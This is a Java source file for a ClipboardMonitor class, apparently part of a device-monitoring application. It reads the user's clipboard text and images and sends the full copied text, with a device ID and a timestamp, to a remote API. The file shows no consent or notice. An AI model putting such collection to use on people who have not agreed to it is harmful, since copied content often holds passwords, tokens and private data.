package com.iotmonitor.monitor;

import com.iotmonitor.network.ApiClient;

import java.awt.Toolkit;
import java.awt.Image;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.image.BufferedImage;
import java.time.Instant;
import java.util.HashMap;
import java.util.Map;

public class ClipboardMonitor {

    private final ApiClient apiClient;
    private String lastSentText;
    private Long lastSentImageHashCode;

    public ClipboardMonitor(ApiClient apiClient) {
        this.apiClient = apiClient;
    }

    public void collectAndSend() {
        try {
            System.out.println("\n=== 📋 CLIPBOARD MONITOR CHECK ===");
            ClipboardData data = readClipboard();
            if (data == null) {
                System.out.println("📋 No clipboard data detected");
                return;
            }

            System.out.println("📋 Clipboard data type: " + data.type);
            System.out.println("📋 Content preview: " + (data.content.length() > 50 ? data.content.substring(0, 50) + "..." : data.content));

            if ("text".equals(data.type) && data.content.equals(lastSentText)) {
                System.out.println("📋 Text unchanged, skipping");
                return;
            }

            if ("image".equals(data.type) && data.imageHashCode != null && data.imageHashCode.equals(lastSentImageHashCode)) {
                System.out.println("📋 Image unchanged, skipping");
                return;
            }

            if ("text".equals(data.type)) {
                lastSentText = data.content;
                System.out.println("📋 Updated last sent text");
            } else if ("image".equals(data.type)) {
                lastSentImageHashCode = data.imageHashCode;
                System.out.println("📋 Updated last sent image hash");
            }

            sendClipboardUpdate(data, Instant.now());
            System.out.println("✅ Clipboard update sent");

        } catch (Exception e) {
            System.err.println("❌ Clipboard monitor error: " + e.getMessage());
        }
    }

    private ClipboardData readClipboard() {
        try {
            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
            Transferable contents = clipboard.getContents(null);
            if (contents == null) {
                return null;
            }

            // Try to read text first
            if (contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                try {
                    String text = (String) contents.getTransferData(DataFlavor.stringFlavor);
                    if (text != null) {
                        return new ClipboardData("text", text, null, (long) text.getBytes(java.nio.charset.StandardCharsets.UTF_8).length);
                    }
                } catch (Exception ignored) {
                }
            }

            // Try to detect image
            if (contents.isDataFlavorSupported(DataFlavor.imageFlavor)) {
                try {
                    Image image = (Image) contents.getTransferData(DataFlavor.imageFlavor);
                    if (image != null) {
                        long hashCode = hashImage(image);
                        int width = Math.max(image.getWidth(null), 0);
                        int height = Math.max(image.getHeight(null), 0);
                        String description = width > 0 && height > 0
                                ? width + "x" + height + " pixels"
                                : "image content detected";
                        long size = width > 0 && height > 0 ? (long) width * height : 0L;
                        return new ClipboardData("image", description, hashCode, size);
                    }
                } catch (Exception ignored) {
                }
            }

        } catch (Exception e) {
            // Clipboard may be unavailable while another app is using it.
        }
        return null;
    }

    private long hashImage(Image image) {
        if (image == null) return 0;
        long hash = ((long) image.getWidth(null) << 32) ^ image.getHeight(null);
        if (image instanceof BufferedImage bufferedImage) {
            int width = bufferedImage.getWidth();
            int height = bufferedImage.getHeight();
            int stepX = Math.max(1, width / 16);
            int stepY = Math.max(1, height / 16);
            for (int y = 0; y < height; y += stepY) {
                for (int x = 0; x < width; x += stepX) {
                    hash = (31 * hash) + bufferedImage.getRGB(x, y);
                }
            }
            return hash;
        }
        return hash ^ System.identityHashCode(image);
    }

    private void sendClipboardUpdate(ClipboardData data, Instant timestamp) {
        System.out.println("📋 Preparing clipboard update payload");
        Map<String, Object> payload = new HashMap<>();
        payload.put("deviceId", apiClient.getDeviceId());
        payload.put("contentType", data.type);
        payload.put("content", data.type.equals("image") ? "[Image: " + data.content + "]" : data.content);
        payload.put("contentSize", data.size);
        payload.put("timestamp", timestamp.toString());
        payload.put("hasImage", data.type.equals("image"));

        System.out.println("📋 Payload: " + payload);
        apiClient.sendClipboardUpdate(payload);
        System.out.println("📋 Clipboard update API call completed");
    }

    private static class ClipboardData {
        String type; // "text" or "image"
        String content;
        Long imageHashCode;
        Long size;

        ClipboardData(String type, String content, Long imageHashCode, Long size) {
            this.type = type;
            this.content = content;
            this.imageHashCode = imageHashCode;
            this.size = size;
        }
    }
}
